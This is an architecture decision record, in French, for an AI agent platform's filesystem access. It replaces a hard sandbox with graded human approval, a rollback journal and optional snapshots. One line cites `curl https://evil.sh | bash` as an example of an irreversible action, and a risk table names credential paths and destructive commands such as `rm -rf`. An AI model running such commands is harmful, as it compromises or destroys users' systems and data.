# ADR-069 - Autonomie filesystem : friction graduée + journal réversible

**Date :** 2026-04-10
**Statut :** Accepté
**Décideur :** Nidal (solo)
**Sprint :** Pré-implémentation (cible : Sprint 38)

---

## Contexte

Apollia se positionne sur des **agents autonomes régulés par HITL**, pas par un sandbox dur (CLAUDE.md, Principes #6 et #7). Pourtant, l'implémentation courante des outils filesystem contredit ce discours :

- **Blocage technique observé** : un agent qui appelle `file_list(dir="/home/user")` reçoit une erreur `SandboxViolation` parce que `SandboxRoot::resolve()` (`crates/apollia-tools/src/sandbox_path.rs:75-79`) rejette **tout chemin absolu** avant même de vérifier le root. Le LLM improvise alors un refus textuel ("outside the sandbox environment"), laissant l'utilisateur perplexe.
- **Sandbox root figé** : `NativeChatToolInvoker::new()` (`crates/apollia-runtime/src/chat/builtin_agent.rs:63-67`) initialise le sandbox root à `$HOME` via `std::env::var("HOME")`, sans jamais permettre de le reconfigurer par session ou par projet.
- **Incohérence avec ADR-061** : le moteur de permissions 3 couches livré au Sprint 36 (SafeList + RiskClassifier + InjectionDetector) ne s'applique **qu'à `bash_executor`**. Les outils filesystem natifs (`file_read`, `file_write`, `file_list`, `file_edit`, `file_glob`, `file_grep`) sont entièrement hors du moteur HITL.
- **Bug latent découvert** : `ProjectRepository::create_project_async` (`crates/apollia-tools/src/project_repository.rs:602-612`) hardcode `workspace_path: None` et n'expose pas le paramètre. Le concept `Project` porte pourtant déjà la bonne abstraction.

Le problème n'est pas théorique : il frustre l'utilisation réelle des agents et contredit le positionnement produit. Il doit être résolu avant d'industrialiser d'autres fonctionnalités qui reposeraient sur ces outils.

**Distinction mentale clarifiée en discussion :**

- **HITL = contrôle utilisateur** (l'utilisateur décide ce qui est dangereux, l'agent demande son feu vert)
- **Sandbox = safety net** (si une action tourne mal, on peut revenir en arrière)
- **Aucun des deux ≠ restriction d'accès** : l'agent doit pouvoir toucher à n'importe quel fichier de la machine. Seules la **friction** (combien de clics pour autoriser) et la **réversibilité** (peut-on annuler) varient.

**Standards et état de l'art référencés :**

- Claude Code : Seatbelt/bwrap optionnel + HITL gradué (ask / accept-edits / bypass) + permissions déclarées dans `settings.json`
- Cursor / Aider : git-based rollback, zéro sandbox
- Devin / OpenHands : isolation Docker complète
- Goose (Block) : capabilities par tool + approval interactive
- ADR-061 (Apollia) : Permission Engine 3 couches pour bash - généralisé ici aux opérations filesystem

---

## Décision

Nous adoptons une **architecture en 4 couches coexistantes** pour l'accès filesystem des agents. Aucune couche ne bride l'accès aux données : elles gradient la friction et garantissent la réversibilité.

### Couche 0 - Workspace déclaratif via `Project`

Réutilisation du concept `Project` existant. Le champ `Project.workspace_path` (déjà présent dans `project_repository.rs`) devient :

- **Obligatoire** à la création de tout projet (Option A strict - pas d'utilisateurs existants à migrer).
- Choisi via **file picker natif** (`tauri-plugin-dialog`, `open({ directory: true, defaultPath })`). Jamais de saisie texte manuelle dans l'UI.
- Pré-rempli avec une **suggestion intelligente** :
  1. Si `$HOME/Apollia` existe → `$HOME/Apollia/<nom-projet>`
  2. Sinon si `$HOME/Documents` existe → `$HOME/Documents/Apollia/<nom-projet>`
  3. Fallback → `$HOME/<nom-projet>`
- Créé à la volée via `create_dir_all` au moment de la confirmation du picker.

**Jamais** de fallback silencieux sur `std::env::current_dir()` - c'est précisément ce qui pointe aujourd'hui vers le dossier d'install d'Apollia (`crates/apollia-desktop`) et produit un comportement inacceptable.

**Chat Libre (hors projet)** : pas de workspace déclaré. Toute écriture filesystem est alors classée **Medium** par défaut (friction HITL systématique), toute lecture reste **Low**. C'est une incitation douce à créer un projet sans jamais bloquer l'usage ponctuel.

### Couche 1 - Risk Classifier étendu aux opérations filesystem

Extension du `RiskClassifier` existant (`crates/apollia-tools/src/tools/risk_classifier.rs`) avec une méthode stateless :

```rust
pub fn classify_filesystem(
    op: FilesystemOp,        // Read | Write | Delete | Chmod | ...
    path: &Path,
    workspace: Option<&Path>,
) -> RiskLevel;               // Safe | Low | Medium | High | Critical
```

Règles de classification :

| Contexte | Niveau |
|---|---|
| In workspace + read | **Safe** |
| In workspace + write | **Low** |
| Out workspace + read | **Low** |
| Out workspace + write | **Medium** |
| Paths système (`/etc`, `/usr`, `/bin`, `/boot`, `~/.ssh`, dotfiles credentials type `~/.aws/credentials`) en **écriture** | **High** |
| `rm -rf`, `truncate`, `chmod`, `chown` - indépendant du path | **High** |

**Paranoïa minimale sur les dotfiles** : la *lecture* des dotfiles (même sensibles) reste Safe/Low. Seule l'écriture ou la suppression dotfiles est Medium/High. Un agent légitime doit pouvoir lire `~/.ssh/config` ou `~/.gitconfig` sans friction.

La classification reste **stateless et sans I/O** - conforme au pattern existant (ADR-061) et au Principe #4 (Fail fast).

### Couche 2 - HITL gradué

| Niveau | Comportement |
|---|---|
| **Safe** | Auto-approve, log silencieux |
| **Low** | Auto-approve + notification toast (annulable 3s) |
| **Medium** | Approval explicite avec diff/preview |
| **High** | Approval + preview + option "always allow" désactivée pour cette session |
| **Critical** | Approval + preview + confirmation secondaire (taper un mot) |

L'utilisateur peut **abaisser** la friction (profil "confiance") ou **la hausser** (profil "parano") via `settings`. Les seuils par défaut privilégient la fluidité d'usage.

### Couche 3 - Journal réversible (le vrai safety net)

Avant **chaque mutation filesystem native**, un journal est écrit dans `~/.apollia/journal/<session-id>/` :

- `write` → contenu précédent + stat (mode, mtime)
- `delete` → contenu + permissions
- `mkdir`/`rmdir` → trace
- `chmod`/`chown` → mode/owner précédent

**Par session de chat**, rétention configurable (défaut : **50 sessions**).

Exposition :

- CLI : `apollia rollback <session>` ou `apollia rollback --last-n 10 --dry-run`
- UI : timeline par session avec undo granulaire

**Ne couvre pas `bash_executor`** : impossible d'inverser `curl https://evil.sh | bash` ou `dd`. Pour bash, la sécurité reste assurée en amont par le `RiskClassifier` existant (ADR-061). Le journal ne tient ses promesses que là où Apollia contrôle l'intégralité du code de mutation - c'est-à-dire les outils filesystem natifs.

### Couche 4 - Snapshot FS natif (opportuniste)

Au démarrage, détection du filesystem hôte :

- **APFS** (macOS) → `tmutil localsnapshot` si disponible
- **btrfs** → `btrfs subvolume snapshot`
- **ZFS** → `zfs snapshot`
- **Autre / aucun** → on s'en passe, le journal suffit

Si disponible, un checkpoint automatique est pris en début de session chat. En cas de catastrophe, l'utilisateur peut restaurer la session complète via CLI. **Jamais requis** - dépendance purement opportuniste, conforme au Principe #2.

### Cleanup technique explicite

- **Supprimer la restriction "chemin absolu interdit"** dans `SandboxRoot::resolve()` (`sandbox_path.rs:75-79`).
- **Supprimer le sandbox root figé à `$HOME`** dans `NativeChatToolInvoker::new()`. Le remplacer par un `Option<PathBuf>` tiré du `Project.workspace_path` de la session courante (via `ChatSessionManager`, `manager.rs:1513-1517`).
- **Corriger le bug** `ProjectRepository::create_project_async` qui hardcode `workspace_path: None` (ligne 609).
- `SandboxRoot` est conservé comme utilitaire de normalisation/bounds-checking **optionnel** (utile pour des scénarios futurs comme agents Python isolés via AIP), mais n'est plus jamais bloquant par défaut sur les outils filesystem chat.

---

## Alternatives considérées

### Option A - Conserver le sandbox dur actuel (rejetée)

**Pour :** Zéro travail, protection "par défaut" contre path traversal.
**Contre :** Contredit frontalement la philosophie Apollia (CLAUDE.md). Bride l'usage réel des agents. Sur macOS en dev, le sandbox logiciel n'apporte rien de plus que le TCC natif de l'OS. Refusé explicitement par le CTO.

### Option B - Copy-on-Write / shadow overlay avant validation (rejetée)

**Pour :** Isolation maximale, rollback gratuit.
**Contre :**
- Les actions s'enchaînent (écriture → compilation → lecture stderr → patch). Si le shadow n'est pas monté dans le process de l'agent, les outils externes (compilateurs, LSP, git) ne voient rien.
- Techniquement faisable sous Linux via OverlayFS + bind mounts, mais nécessite des privilèges ou userns - viole le Principe #2 (zéro dépendance externe).
- Casse l'intégration native avec venvs, git hooks, LSP.
- macOS n'a pas d'équivalent propre d'OverlayFS.

### Option C - Rollback uniquement via git, à la Cursor/Aider (rejetée)

**Pour :** Simple, zéro nouveau code, leverages une infra connue.
**Contre :** Ne couvre que les fichiers versionnés. Toute opération hors-repo (docs utilisateur, configs système, fichiers générés hors .gitignore) n'est pas rollback-able. Ne protège pas contre les suppressions massives.

### Option D - Isolation Docker/container complète, à la Devin/OpenHands (rejetée)

**Pour :** Sécurité maximale, état de l'art cloud.
**Contre :** Contraire au positionnement local-first autonome. Casse l'intégration avec l'outillage natif de l'utilisateur (ses venvs, son git, son LSP, ses clés SSH). Ajoute une dépendance lourde (Docker Desktop) contraire au Principe #2.

### Option retenue - Architecture en 4 couches (HITL gradué + journal + snapshots opportunistes)

**Pour :**
- Respecte la distinction conceptuelle correcte (HITL = contrôle, sandbox = safety net, accès = illimité).
- Aligné avec l'état de l'art récent (Claude Code, Goose).
- Réutilise massivement l'existant : `Project`, `RiskClassifier`, `tauri-plugin-dialog`.
- Zéro dépendance externe nouvelle (Couche 4 opportuniste).
- L'agent n'est **jamais bridé** - il peut tout toucher, la question c'est la friction.
- Le journal couvre le cas réel (mutations natives), sans promettre l'impossible (bash arbitraire).

**Compromis acceptés :**
- Complexité d'implémentation répartie sur 4 couches - mais chaque couche reste simple individuellement.
- Le journal a un coût disque (à plafonner via rétention configurable).
- Le Chat Libre est moins fluide qu'avec un Project actif - c'est assumé comme un nudge UX vers les projets.
- La Couche 4 (snapshots FS) est bonus et ne sera pas disponible sur tous les systèmes - c'est explicite et assumé.

---

## Conséquences

**Positives :**
- L'agent peut lister/lire/écrire n'importe où sur la machine, sous réserve de validation HITL pour les cas à risque.
- L'utilisateur garde un contrôle total et peut annuler toute mutation filesystem native via `apollia rollback`.
- Le file picker natif élimine toute saisie manuelle de chemin - UX nettement meilleure.
- Le moteur de permissions d'ADR-061 est généralisé au-delà de bash, cohérence architecturale renforcée.
- Le bug latent sur `workspace_path` dans le repository est corrigé au passage.

**Négatives / Compromis :**
- Implémentation non-triviale : classifier filesystem, journal acteur Tokio, UI HITL pour fichiers, file picker dialog, refactor `NativeChatToolInvoker`. Probablement un sprint entier.
- Le journal introduit une écriture disque supplémentaire avant chaque mutation - overhead acceptable mais à mesurer sur les scénarios intensifs (ex. génération de gros fichiers par l'agent).
- Les snapshots FS natifs ne seront pas disponibles sur ext4/FAT/NTFS sans outillage tiers - c'est assumé.
- La suppression de la restriction "chemin absolu interdit" ouvre une surface d'attaque théorique si un jour un agent non-fiable est exécuté - compensé par le fait que chaque mutation passe par HITL et est réversible.

**Neutres / À surveiller :**
- Temps de réaction du HITL filesystem sur des chaînes d'opérations (ex. agent qui écrit 50 fichiers) - prévoir un mode batch ou "always allow for this session/pattern".
- Classification `RiskLevel` des paths système : la liste hardcodée (`/etc`, `/usr`, etc.) doit rester configurable via `apollia.toml` pour ne pas bloquer des usages légitimes spécifiques.
- Interaction avec les agents AIP Python existants (qui ont leur propre modèle d'isolation via ADR-005 sandbox multi-plateforme) - cet ADR **ne modifie pas** ce modèle, il ne s'applique qu'aux outils natifs invoqués par les chat agents.

---

## Principes architecturaux impactés

- **Principe #1 - Local-first** : Renforcé. Journal et snapshots restent locaux. Aucun octet ne sort de la machine.
- **Principe #2 - Zéro dépendance externe** : Respecté. Couche 4 opportuniste, jamais requise.
- **Principe #4 - Fail fast** : Respecté. Classifier synchrone, erreurs détectées au moment de l'appel.
- **Principe #5 - Un acteur, une responsabilité** : Le `JournalWriter` et le `HitlBroker` deviennent deux nouveaux acteurs Tokio indépendants, sans état partagé.
- **Principe #6 - Mémoire à initiative de l'agent** : Non-impacté.
- **Principe #7 - Garde-fous non-contournables** : Renforcé. Le journal est écrit *avant* toute mutation - impossible à bypass sans modifier le code de l'outil lui-même.
- **Principe #8 - CLI humaine, API machine** : Respecté. `apollia rollback --session X --dry-run --json` s'intègre naturellement.

Cet ADR **complète et généralise ADR-061** sans le remplacer : ADR-061 s'applique toujours intégralement à `bash_executor`. Cet ADR étend le même esprit de classification aux opérations filesystem et ajoute la dimension réversibilité.

---

## Liens

- ADR complété : [ADR-061 - Permission Engine 3 Couches](ADR-061-permission-engine-3-layers.md) (généralisé aux opérations filesystem)
- ADR connexes : [ADR-005 - Sandbox multi-plateforme](ADR-005-sandbox-sans-docker.md) (sandbox process-level AIP - non impacté)
- Story d'implémentation : à créer (Sprint 38, cible)
- Fichiers impactés identifiés :
  - `crates/apollia-tools/src/sandbox_path.rs`
  - `crates/apollia-tools/src/tools/risk_classifier.rs`
  - `crates/apollia-tools/src/project_repository.rs`
  - `crates/apollia-tools/src/tools/file_*.rs`
  - `crates/apollia-tools/src/journal.rs` (nouveau)
  - `crates/apollia-runtime/src/chat/builtin_agent.rs`
  - `crates/apollia-runtime/src/chat/manager.rs`
  - `crates/apollia-desktop/src/commands/projects.rs`
  - `crates/apollia-desktop/ui/src/components/projects/CreateProjectDialog.svelte`
